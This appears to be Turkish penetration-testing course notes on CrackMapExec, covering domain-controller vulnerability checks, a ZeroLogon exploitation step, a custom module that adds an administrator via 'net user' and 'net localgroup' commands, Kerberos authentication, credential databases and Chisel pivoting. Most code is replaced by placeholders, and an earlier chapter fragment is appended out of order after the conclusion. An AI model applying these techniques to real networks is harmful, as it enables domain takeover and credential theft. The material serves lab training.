Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

